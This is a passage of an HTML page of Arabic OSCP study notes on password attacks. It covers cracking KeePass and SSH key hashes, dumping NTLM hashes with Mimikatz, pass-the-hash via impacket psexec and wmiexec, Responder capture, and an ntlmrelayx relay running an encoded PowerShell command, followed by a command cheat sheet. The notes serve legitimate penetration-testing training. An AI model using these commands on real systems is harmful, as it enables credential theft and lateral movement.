+<div class="step-item"><div class="step-num">1</div><div class="step-title">الوصول والاكتشاف</div><div class="step-body"><p>الاتصال عبر RDP، التحقق من التطبيقات المثبَّتة، تأكيد وجود KeePass</p></div></div>
+<div class="step-item"><div class="step-num">2</div><div class="step-title">تحديد موقع قاعدة البيانات</div><div class="step-body">
+<div class="code-wrap"><span class="code-tag">powershell</span><pre><code>Get-ChildItem -Path C:\ -Include *.kdbx -Recurse
+# إيجاد Database.kdbx
+</code></pre></div>
+</div></div>
+<div class="step-item"><div class="step-num">3</div><div class="step-title">التحويل لـ Hash</div><div class="step-body">
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code>keepass2john Database.kdbx > keepass.hash
+# إزالة بادئة اسم الملف قبل النقطتين
+</code></pre></div>
+</div></div>
+<div class="step-item"><div class="step-num">4</div><div class="step-title">تحديد الوضع</div><div class="step-body">
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code>hashcat --help | grep -i KeePass
+# الوضع 13400 (KeePass 1/2 AES)
+</code></pre></div>
+</div></div>
+<div class="step-item"><div class="step-num">5</div><div class="step-title">شنّ الهجوم</div><div class="step-body">
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code>hashcat -m 13400 keepass.hash rockyou.txt \
+  -r rockyou-30000.rule --force
+</code></pre></div>
+</div></div>
+<div class="step-item"><div class="step-num">6</div><div class="step-title">فتح الـ Vault</div><div class="step-body"><p>استخدام الباسورد الرئيسي المكتشَف لفتح KeePass — كل بيانات الاعتماد المخزَّنة تنكشف</p></div></div>
+</div>
+
+<h3>كسر Passphrase مفتاح SSH الخاص</h3>
+<p><strong>كيف تتعرّض المفاتيح:</strong> ثغرات Directory Traversal أو قراءة ملفات ممكن تكشف <code>~/.ssh/id_rsa</code>. حتى مع المفتاح، الـ passphrase بيمنع الاستخدام المباشر.</p>
+
+<div class="callout case">
+<div class="callout-label">✎ استخبارات السيناريو (note.txt)</div>
+<p>باسوردات Dave: Window، rickc137، dave، superdave، megadave، umbrella | سياسة (يناير 2022): 3 أرقام + capital + special character | النمط: Dave بيستخدم '137'، بيكبّر الحرف الأول</p>
+<p>ملف القواعد المبني من الاستخبارات:</p>
+<div class="rule-demo" style="margin:10px 0 0;">
+  <div class="rule-row"><span class="rule-code">c $1 $3 $7 $!</span><span class="rule-arrow">→</span><span class="rule-val">Window137!</span></div>
+  <div class="rule-row"><span class="rule-code">c $1 $3 $7 $@</span><span class="rule-arrow">→</span><span class="rule-val">Window137@</span></div>
+</div>
+</div>
+
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code># تحويل المفتاح لـ hash قابل للكسر
+chmod 600 id_rsa
+ssh2john id_rsa > ssh.hash
+
+# إيجاد الوضع الصحيح
+hashcat -h | grep -i ssh
+# الوضع 22921 = OpenSSH private keys
+
+# لو Hashcat فشل (AES-256-CTR) استخدم John:
+john --wordlist=ssh.passwords \
+  --rules=sshRules ssh.hash
+
+# الـ passphrase المكتشَف:
+# Umbrella137!
+
+# التوثيق بالمفتاح
+ssh -i id_rsa -p 2222 dave@192.168.50.50
+</code></pre></div>
+<div class="callout tip">
+<div class="callout-label">✓ الدرس</div>
+<p>الاستخبارات المتعلقة بأنماط باسوردات الشخص المستهدَف (سنة، حيوان محبوب، نمط رقمي) تمكّن بناء wordlist صغيرة ومركّزة بدلًا من تشغيل rockyou.txt الكامل — مما يوفّر وقتًا ثمينًا.</p>
+</div>
+
+<div class="takeaways">
+<div class="takeaways-title">$ cat ./lu3_takeaways.txt</div>
+<ul>
+<li>keepass2john و ssh2john بيحوّلوا الـ vaults والمفاتيح لهاشات قابلة للكسر بـ Hashcat/John</li>
+<li>ملف قواعد مبني من استخبارات OSINT للهدف أكثر فعالية من wordlists عامة</li>
+<li>ترتيب قواعد الـ hashcat مهم — $1 $3 $7 $! غير $! $1 $3 $7</li>
+<li>لو Hashcat فشل في hash format معين، جرّب John the Ripper</li>
+</ul>
+</div>
+
+<hr />
+
+<h2 id="lu4"><span class="num">04</span><span class="htext">NTLM Hashes وPass-the-Hash</span></h2>
+<h3>كيف Windows يخزّن كلمات المرور</h3>
+<div class="compare-grid">
+<div class="cmp-card red">
+  <div class="cmp-title">LM Hash (قديم — معطَّل منذ Vista)</div>
+  <ul>
+    <li>مبني على تشفير DES ضعيف</li>
+    <li>case-insensitive، حد أقصى 14 حرفًا</li>
+    <li>الباسوردات +7 أحرف تُقسَّم لنصفين كل منهما يتعمل له hash منفصل</li>
+    <li>سهل الكسر حتى اليوم</li>
+  </ul>
+</div>
+<div class="cmp-card green">
+  <div class="cmp-title">NTLM Hash (المعيار الحالي)</div>
+  <ul>
+    <li>case-sensitive، لا حد للطول، لا تقسيم</li>
+    <li>لا salting ← rainbow tables تعمل</li>
+    <li>ثابت عبر الجلسات ← قابل لإعادة الاستخدام في PtH</li>
+    <li>مخزَّن في SAM (Security Account Manager)</li>
+  </ul>
+</div>
+</div>
+
+<h3>استخراج NTLM Hashes بـ Mimikatz</h3>
+<p><strong>LSASS — العملية المستهدَفة:</strong> Local Security Authority Subsystem Service — تتعامل مع توثيق المستخدم، تغييرات الباسورد، إنشاء access tokens. تُخزَّن NTLM hashes في الذاكرة ← كنز للمهاجمين.</p>
+<p><strong>الصلاحيات المطلوبة:</strong> حساب Administrator + SeDebugPrivilege (صلاحيات debug) + SYSTEM-level token (عبر <code>token::elevate</code>)</p>
+
+<div class="code-wrap"><span class="code-tag">powershell / mimikatz</span><pre><code># حصر الحسابات المحلية
+Get-LocalUser
+
+# فتح Mimikatz والتصعيد
+privilege::debug
+token::elevate
+
+# تفريغ SAM hashes
+lsadump::sam
+
+# مثال على الخرج
+# User: nelly
+# NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
+
+# كسر offline بـ Hashcat (الوضع 1000)
+hashcat -m 1000 ntlm.hash rockyou.txt
+</code></pre></div>
+
+<h3>Pass-the-Hash (PtH) — المفهوم والمتطلبات</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ Definition</div>
+<p><strong>Pass-the-Hash</strong> = التوثيق لـ Windows باستخدام username صالح + NTLM hash — بدون الحاجة لكلمة مرور واضحة. بما إن NTLM hashes غير مُملَّحة (unsalted) وتبقى ثابتة عبر الجلسات، الـ hash المستخرَج من نظام واحد يمكن استخدامه للتوثيق لأنظمة أخرى تشترك نفس بيانات الاعتماد.</p>
+</div>
+<p><strong>البروتوكولات التي تدعم التوثيق بالـ Hash:</strong> SMB (مشاركات ملفات، lateral movement)، RDP (دعم محدود في بعض الإعدادات)، WinRM (PowerShell عن بُعد)</p>
+<div class="callout note">
+<div class="callout-label">ⓘ UAC Remote Restrictions</div>
+<p>حسابات المدير المحلي (local administrator) مقيَّدة من الأفعال الإدارية عن بُعد افتراضيًا. <strong>الاستثناء:</strong> حساب Administrator المدمَج (RID 500) يتجاوز هذه القيود.</p>
+</div>
+
+<h3>هجوم Pass-the-Hash — خطوة بخطوة</h3>
+<div class="step-track">
+<div class="step-item"><div class="step-num">1</div><div class="step-title">اختراق المضيف الأولي</div><div class="step-body"><p>الوصول لـ FILES01، الحصول على بيانات اعتماد حساب مستخدم</p></div></div>
+<div class="step-item"><div class="step-num">2</div><div class="step-title">محاولة الوصول للهدف</div><div class="step-body"><p>محاولة الوصول لـ <code>\\192.168.50.50\secrets</code> على FILES02 — الوصول يفشل</p></div></div>
+<div class="step-item"><div class="step-num">3</div><div class="step-title">استخراج Hash Administrator</div><div class="step-body">
+<div class="code-wrap"><span class="code-tag">mimikatz</span><pre><code>privilege::debug → token::elevate → lsadump::sam
+</code></pre></div>
+</div></div>
+<div class="step-item"><div class="step-num">4</div><div class="step-title">الوصول لـ SMB Share بالـ Hash</div><div class="step-body">
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code># عبر smbclient
+smbclient \\\\192.168.50.50\\secrets \
+  -U "Administrator%aad3b435b51404eeaad3b435b51404ee:NTLM_HASH_HERE"
+
+# عبر CrackMapExec
+crackmapexec smb 192.168.50.50 \
+  -u Administrator \
+  -H NTLM_HASH_HERE \
+  --shares
+</code></pre></div>
+</div></div>
+<div class="step-item"><div class="step-num">5</div><div class="step-title">الحصول على Shell عن بُعد</div><div class="step-body">
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code># SYSTEM shell عبر psexec
+impacket-psexec Administrator@192.168.50.50 \
+  -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
+
+# User-context shell عبر wmiexec
+impacket-wmiexec Administrator@192.168.50.50 \
+  -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
+</code></pre></div>
+</div></div>
+</div>
+
+<div class="takeaways">
+<div class="takeaways-title">$ cat ./lu4_takeaways.txt</div>
+<ul>
+<li>Mimikatz محتاج Admin + SeDebugPrivilege + token elevation — الثلاثة ضروريين</li>
+<li>NTLM hashes غير مُملَّحة = ثابتة = قابلة للاستخدام المباشر في PtH</li>
+<li>psexec يعطي SYSTEM shell | wmiexec يعطي shell بسياق المستخدم</li>
+<li>حساب Administrator المدمَج (RID 500) يتجاوز UAC remote restrictions</li>
+</ul>
+</div>
+
+<hr />
+
+<h2 id="lu5"><span class="num">05</span><span class="htext">Net-NTLMv2 — التقاط وكسر وإعادة توجيه</span></h2>
+<h3>كيف يعمل توثيق Net-NTLMv2</h3>
+<p>Windows بيرجع لـ Net-NTLMv2 لتسجيلات الدخول الشبكية لما Kerberos غير متاح أو غير مدعوم. شائع للتوافق الخلفي في البيئات المختلطة أو القديمة.</p>
+
+<div class="diagram-card">
+<svg viewBox="0 0 760 180" xmlns="http://www.w3.org/2000/svg">
+  <defs>
+    <marker id="arr13" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="#E8A23A"/>
+    </marker>
+    <marker id="arr13b" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="#3FBF6E"/>
+    </marker>
+  </defs>
+  <g font-family="IBM Plex Mono, monospace" font-size="11" fill="#C4C4CA">
+    <rect x="30" y="50" width="120" height="70" rx="8" fill="#17171A" stroke="#2A2A2F"/>
+    <text x="90" y="82" text-anchor="middle" fill="#E8A23A" font-weight="700">Client</text>
+    <text x="90" y="100" text-anchor="middle" font-size="10">Windows Host</text>
+
+    <rect x="320" y="50" width="120" height="70" rx="8" fill="#17171A" stroke="#2A2A2F"/>
+    <text x="380" y="82" text-anchor="middle" fill="#8A8A92" font-weight="700">Server</text>
+    <text x="380" y="100" text-anchor="middle" font-size="10">SMB Share</text>
+
+    <rect x="610" y="50" width="130" height="70" rx="8" fill="#1D1D21" stroke="#E1362F" stroke-width="1.6"/>
+    <text x="675" y="79" text-anchor="middle" fill="#E1362F" font-weight="700">Attacker</text>
+    <text x="675" y="97" text-anchor="middle" font-size="10">Responder / Relay</text>
+
+    <!-- Step 1 -->
+    <path d="M150 75 H320" stroke="#E8A23A" stroke-width="1.8" marker-end="url(#arr13)"/>
+    <text x="235" y="68" text-anchor="middle" font-size="10">1) طلب وصول</text>
+
+    <!-- Step 2 -->
+    <path d="M320 95 H150" stroke="#8A8A92" stroke-width="1.8" marker-end="url(#arr13b)"/>
+    <text x="235" y="115" text-anchor="middle" font-size="10">2) challenge (nonce)</text>
+
+    <!-- Step 3 -->
+    <path d="M150 115 H320" stroke="#E8A23A" stroke-width="1.8" marker-end="url(#arr13)"/>
+    <text x="235" y="138" text-anchor="middle" font-size="10">3) response (مشفَّر بالـ NTLM hash)</text>
+
+    <!-- Attacker intercepts -->
+    <path d="M380 50 Q380 20 675 50" stroke="#E1362F" stroke-width="1.6" stroke-dasharray="5,3" fill="none" marker-end="url(#arr13)"/>
+    <text x="527" y="18" text-anchor="middle" font-size="10" fill="#E1362F">Responder يلتقط الـ challenge-response</text>
+  </g>
+</svg>
+<div class="diagram-caption">بروتوكول Net-NTLMv2: الـ response المشفَّر بيحتوي بيانات مشتقة من الـ NTLM hash الحقيقي للمستخدم</div>
+</div>
+
+<h3>ليه المهاجمين يستهدفون ده</h3>
+<p>الـ response المشفَّر يحتوي بيانات مشتقة من الـ NTLM hash الحقيقي للمستخدم. التقاط هذا الـ response يمكّن من <strong>كسر الباسورد offline</strong>. لو الكسر فشل، التوثيق المُلتقَط لسه ممكن إعادة توجيهه (relay) لأنظمة أخرى.</p>
+
+<h3>التقاط Net-NTLMv2 Hashes بـ Responder</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ كيف يعمل Responder</div>
+<p>بيتصرّف كـ SMB / HTTP / FTP server مزيَّف. بيُسمَّم استعلامات LLMNR وNetBIOS-NS لحلّ أسماء الشبكة. بيعترض محاولات التوثيق ويلتقط الـ challenge-response hash.</p>
+</div>
+
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code># 1. تشغيل Responder كـ SMB server مزيَّف
+sudo responder -I eth0 -v
+
+# 2. تحفيز التوثيق على الهدف (لو command exec متاح)
+dir \\192.168.45.X\test
+
+# Responder بيلتقط:
+# [SMB] NTLMv2-SSP Hash: paul::DESKTOP01:aabbccdd...
+
+# 3. الكسر بـ Hashcat (الوضع 5600 = NetNTLMv2)
+hashcat -m 5600 paul.hash \
+  rockyou.txt --force
+
+# 4. استخدام بيانات الاعتماد المكتشَفة عبر RDP
+xfreerdp /u:paul /p:Password1 /v:192.168.50.X
+</code></pre></div>
+
+<h3>هجوم Net-NTLMv2 Relay</h3>
+<p><strong>لما الكسر يفشل:</strong> الباسوردات القوية ممكن تقاوم الكسر خلال فترة المهمة. البديل: إعادة توجيه التوثيل المُلتقَط مباشرةً — بدون الحاجة للكسر.</p>
+
+<div class="callout definition">
+<div class="callout-label">⬦ كيف يعمل هجوم Relay</div>
+<p>1) الهدف بيتوثّق للـ server المزيَّف للمهاجم (ntlmrelayx) | 2) المهاجم بيُعيد توجيه (relay) ذلك التوثيق لجهاز هدف ثانٍ | 3) الجهاز الثاني يقبله كتسجيل دخول شرعي | 4) لو المستخدم المُعاد توجيهه عنده صلاحيات admin ← تنفيذ أوامر عن بُعد ممكن</p>
+</div>
+
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code># ntlmrelayx بيعيد توجيه التوثيق للهدف الثاني
+impacket-ntlmrelayx \
+  --no-http-server \
+  -smb2support \
+  -t 192.168.50.212 \
+  -c "powershell -enc JABjAGwAaQBlA..."
+</code></pre></div>
+<div class="callout warning">
+<div class="callout-label">⚠ متطلب حرج</div>
+<p>SMB signing لازم يكون <strong>معطَّلًا</strong> على الجهاز الهدف عشان هجوم الـ relay ينجح. لو SMB signing مفعَّل، الـ relay هيفشل لأن الجهاز هيتحقق من توقيع رسائل SMB.</p>
+</div>
+
+<div class="takeaways">
+<div class="takeaways-title">$ cat ./lu5_takeaways.txt</div>
+<ul>
+<li>Responder بيستهدف LLMNR/NetBIOS poisoning لالتقاط NTLMv2 challenge-response hashes</li>
+<li>كسر NTLMv2 = Hashcat وضع 5600 + rockyou.txt</li>
+<li>لو الكسر فشل، ntlmrelayx بيعيد التوجيه مباشرةً — لا كسر مطلوب</li>
+<li>Relay يشترط SMB signing معطَّل على الهدف</li>
+<li>UNC paths في نماذج رفع الملفات أو المستندات = ناقلات بديلة لتحفيز التوثيق</li>
+</ul>
+</div>
+
+<hr />
+
+<h2 id="cheat"><span class="htext">Cheat Sheet مرجعي</span></h2>
+<div class="cheat-section">
+<h4>Hydra — أوامر أساسية</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>الأمر</th><th>الوظيفة</th></tr></thead>
+<tbody>
+<tr><td><code>hydra -l USER -P list.txt HOST ssh</code></td><td>dictionary attack على SSH</td></tr>
+<tr><td><code>hydra -L users.txt -p PASS HOST rdp</code></td><td>password spraying على RDP</td></tr>
+<tr><td><code>hydra -l USER -P list.txt HOST http-post-form "/path:user=^USER^&pass=^PASS^:Fail msg"</code></td><td>هجوم على HTTP POST form</td></tr>
+<tr><td><code>-s PORT</code></td><td>تحديد بورت غير افتراضي</td></tr>
+<tr><td><code>-t 4</code></td><td>عدد threads المتوازية (افتراضي 16)</td></tr>
+</tbody>
+</table></div>
+
+<h4>Hashcat — أوضاع شائعة وأوامر</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>الوضع</th><th>نوع الـ Hash</th><th>الأمر</th></tr></thead>
+<tbody>
+<tr><td>1000</td><td>NTLM</td><td><code>hashcat -m 1000 hash.txt wordlist.txt</code></td></tr>
+<tr><td>5600</td><td>NetNTLMv2</td><td><code>hashcat -m 5600 hash.txt wordlist.txt --force</code></td></tr>
+<tr><td>13400</td><td>KeePass 1/2</td><td><code>hashcat -m 13400 hash.txt wordlist.txt -r rules.rule</code></td></tr>
+<tr><td>22921</td><td>SSH Private Key</td><td><code>hashcat -m 22921 hash.txt wordlist.txt</code></td></tr>
+<tr><td>أي</td><td>مع قواعد</td><td><code>-r /usr/share/hashcat/rules/rockyou-30000.rule</code></td></tr>
+</tbody>
+</table></div>
+
+<h4>تحويل الملفات لهاشات</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>الأداة</th><th>الأمر</th><th>الخرج</th></tr></thead>
+<tbody>
+<tr><td>keepass2john</td><td><code>keepass2john db.kdbx > keepass.hash</code></td><td>hash وضع 13400</td></tr>
+<tr><td>ssh2john</td><td><code>ssh2john id_rsa > ssh.hash</code></td><td>hash وضع 22921</td></tr>
+<tr><td>hashid</td><td><code>hashid hash_value</code></td><td>تحديد نوع الـ hash</td></tr>
+</tbody>
+</table></div>
+
+<h4>أدوات Pass-the-Hash</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>الأداة</th><th>الاستخدام</th></tr></thead>
+<tbody>
+<tr><td><code>impacket-psexec</code></td><td>SYSTEM shell عبر PtH</td></tr>
+<tr><td><code>impacket-wmiexec</code></td><td>shell بسياق المستخدم عبر PtH</td></tr>
+<tr><td><code>crackmapexec smb</code></td><td>فحص وتنفيذ عبر SMB بالـ hash</td></tr>
+<tr><td><code>smbclient</code></td><td>الوصول لمشاركات SMB بالـ hash</td></tr>
+<tr><td><code>impacket-ntlmrelayx</code></td><td>relay هجوم NTLMv2</td></tr>
+<tr><td><code>responder -I eth0 -v</code></td><td>التقاط NTLMv2 hashes</td></tr>
+</tbody>
+</table></div>
+
+<h4>Mimikatz — الأوامر الأساسية</h4>
+<div class="code-wrap"><span class="code-tag">mimikatz</span><pre><code>privilege::debug          # الحصول على SeDebugPrivilege
+token::elevate            # تصعيد للـ SYSTEM token
+lsadump::sam              # تفريغ NTLM hashes من SAM
+sekurlsa::logonpasswords  # استخراج كلمات مرور من LSASS
+</code></pre></div>
+</div>
+
+<hr />
+
+<h2 id="summary"><span class="htext">الخلاصة العامة للموديول</span></h2>
+<p>في الموديول ده، غطّينا طيفًا واسعًا من تقنيات هجمات كلمات المرور — من هجمات online على خدمات الشبكة، لحد الكسر offline المتطوّر، وصولًا لاستغلال بروتوكولات Windows للتنقّل الجانبي (lateral movement).</p>
+
+<div class="table-wrap"><table>
+<thead><tr><th>التقنية</th><th>الهدف</th><th>الأداة الرئيسية</th></tr></thead>
+<tbody>
+<tr><td>Dictionary / Brute Force</td><td>SSH، RDP، HTTP logins</td><td>Hydra</td></tr>
+<tr><td>Offline Hash Cracking</td><td>NTLM، NTLMv2، KeePass، SSH keys</td><td>Hashcat، John</td></tr>
+<tr><td>Rule-Based Mutation</td><td>تحقيق متطلبات سياسة الباسورد</td><td>Hashcat rules</td></tr>
+<tr><td>Hash Extraction</td><td>LSASS / SAM</td><td>Mimikatz</td></tr>
+<tr><td>Pass-the-Hash</td><td>Lateral movement بدون باسورد</td><td>psexec، wmiexec، CrackMapExec</td></tr>
+<tr><td>NTLMv2 Capture</td><td>التقاط challenge-response</td><td>Responder</td></tr>
+<tr><td>NTLMv2 Relay</td><td>الوصول بدون كسر</td><td>ntlmrelayx</td></tr>
+</tbody>
+</table></div>
+
+<blockquote>
+<p><strong>الدرس الأهم في الموديول ده:</strong> هجمات كلمات المرور مش بس "جرّب كل الاحتمالات". المحترف الحقيقي بيجمع استخبارات عن الهدف، يبني wordlist مخصَّصة، ويختار التقنية الصح (online/offline/relay/PtH) بناءً على البيئة المستهدَفة والوقت المتاح. الـ hash المُستخرَج ممكن يكون أقوى من الباسورد نفسه — لأنه لا يحتاج كسرًا لاستخدامه.</p>
+</blockquote>
+<hr />
+<p><em>نهاية نوتس الموديول الثالث عشر — OSCP: Password Attacks</em></p>
+  <div class="footer-note">-- EOF: module-13/password-attacks.md --</div>
+</div>
+
+<script>
+(function(){
+  var root=document.documentElement;
+  var btn=document.getElementById('themeSwitch');
+  function applyTheme(t){root.setAttribute('data-theme',t);btn.textContent='theme: '+t;try{localStorage.setItem('oscp-notes-theme',t);}catch(e){}}
+  var saved='dark';try{saved=localStorage.getItem('oscp-notes-theme')||'dark';}catch(e){}
+  applyTheme(saved);
+  btn.addEventListener('click',function(){applyTheme(root.getAttribute('data-theme')==='dark'?'light':'dark');});
+  var bar=document.getElementById('progressBar');
+  function onScroll(){var h=document.documentElement;var s=h.scrollTop;var ht=h.scrollHeight-h.clientHeight;bar.style.width=(ht>0?(s/ht*100):0)+'%';var t=document.getElementById('toTop');if(s>500){t.classList.add('show');}else{t.classList.remove('show');}}
+  document.addEventListener('scroll',onScroll);onScroll();
+  document.getElementById('toTop').addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+  document.querySelectorAll('.code-wrap').forEach(function(wrap){
+    var codeEl=wrap.querySelector('code');if(!codeEl)return;
+    var b=document.createElement('button');b.className='copy-btn';b.textContent='copy';
+    b.addEventListener('click',function(){
+      var text=codeEl.innerText;
+      if(navigator.clipboard){navigator.clipboard.writeText(text).then(function(){b.textContent='copied ✓';b.classList.add('copied');setTimeout(function(){b.textContent='copy';b.classList.remove('copied');},1500);});}
+    });
+    wrap.appendChild(b);
+  });
+})();
+</script>
+</body>
+</html>
